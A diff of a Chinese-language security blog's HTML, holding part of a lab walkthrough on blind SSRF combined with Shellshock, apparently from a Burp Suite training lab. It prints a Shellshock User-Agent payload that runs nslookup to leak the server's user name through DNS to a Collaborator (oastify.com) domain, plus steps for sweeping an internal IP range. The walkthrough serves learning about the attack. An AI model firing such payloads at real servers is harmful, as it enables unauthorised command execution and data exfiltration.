+<li>转至Collaborator标签页生成唯一Burp Collaborator有效载荷。将此内容放入Shellshock有效负载</li>
+</ol>
+<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">User-Agent:</span> <span class="string">()</span> &#123; <span class="string">:;</span> &#125;<span class="string">;</span> <span class="string">/usr/bin/nslookup</span> <span class="string">$(whoami).k9udcmqymw0o7c46r2xz74tj8ae12sqh.oastify.com</span></span><br><span class="line"></span><br><span class="line"><span class="attr">Referer:</span> <span class="string">http://192.168.0.1:8080</span></span><br></pre></td></tr></table></figure>
+
+<ol>
+<li>将Burp Intruder请求中的User-Agent字符串替换为包含Collaborator域名的Shellshock有效负载。</li>
+<li>将Referer头修改为<a href="http://192.168.0.1:8080，选中IP地址末位八位组（数字1），点击添加§。">http://192.168.0.1:8080，选中IP地址末位八位组（数字1），点击添加§。</a> 在有效载荷侧边栏中，将有效载荷类型改为数字，分别在起始值、终止值和步长框中输入1、255和1</li>
+<li>攻击完成后，转到协作方选项卡，点击立即轮询。若未显示任何交互记录，请等待数秒后重试，因服务器端命令采用异步执行。此时应可见由后端系统发起的DNS交互记录——该系统正是成功盲SSRF攻击的目标。操作系统用户的名称将出现在DNS子域中。</li>
+<li>完成实验操作，请输入操作系统用户的名称。</li>
+</ol>
+<p><img src="/images/image-20251203105814-zeuf320.png" alt="image"></p>
+<p><img src="/images/image-20251203111201-ivd9azs.png" alt="image"></p>
+<p><img src="/images/image-20251203113203-aatvzlr.png" alt="image"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">() &#123; :; &#125;;</span><br></pre></td></tr></table></figure>
+
+<p>这是 Shellshock 漏洞的标志性特征。</p>
+<ul>
+<li><strong>原理：</strong>  在受影响的 Bash 版本中，如果环境变量的值以函数定义 <code>() &#123; ... &#125;</code> 开头，Bash 会在导入该环境变量时执行函数定义后面的额外命令。</li>
+<li><strong>上下文：</strong>  在 Web服务器（如使用 CGI 的 Apache）中，HTTP 请求头（如 <code>User-Agent</code>​）通常会被转换为环境变量（如 <code>HTTP_USER_AGENT</code>​）。因此，攻击者通过修改 <code>User-Agent</code> 就可以向 Bash 注入恶意环境变量。</li>
+</ul>
+<p>‍</p>
+<ol>
+<li><strong>目标服务器</strong>向本地 DNS 服务器发起查询请求：“请告诉我 <code>root.k9udcm....oastify.com</code> 的 IP 是多少？”</li>
+<li>如果不在此缓存中，本地 DNS 会逐级查询，最终请求会到达负责解析 <code>oastify.com</code>​ 的​<strong>权威名称服务器</strong>。</li>
+<li><strong>攻击者</strong>控制着这台权威名称服务器（在这个例子中，<code>oastify.com</code> 是 Burp Suite Collaborator 的专用域名）。</li>
+<li><strong>捕获：</strong>  攻击者在名称服务器的日志中看到了一条查询记录，记录中包含了 <code>root</code> 这个前缀。</li>
+<li><strong>结果：</strong>  攻击者成功获知目标服务器是以 <code>root</code> 权限运行的，且证明了该服务器存在 Shellshock 漏洞。</li>
+</ol>
+<hr>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2026/01/19/Server-side%20request%20forgery%20(SSRF)/" data-id="cmkkn2g3x0000agvs4wmc8k45" data-title="3.Server-side request forgery (SSRF)" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
     <article id="post-Authentication身份验证" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
   <div class="article-meta">
     <a href="/2026/01/12/Authentication%E8%BA%AB%E4%BB%BD%E9%AA%8C%E8%AF%81/" class="article-date">
@@ -665,6 +897,10 @@
     <h3 class="widget-title">Recent Posts</h3>
     <div class="widget">
       <ul>
+        
+          <li>
+            <a href="/2026/01/19/Server-side%20request%20forgery%20(SSRF)/">3.Server-side request forgery (SSRF)</a>
+          </li>
         
           <li>
             <a href="/2026/01/12/Authentication%E8%BA%AB%E4%BB%BD%E9%AA%8C%E8%AF%81/">2.Authentication身份验证</a>
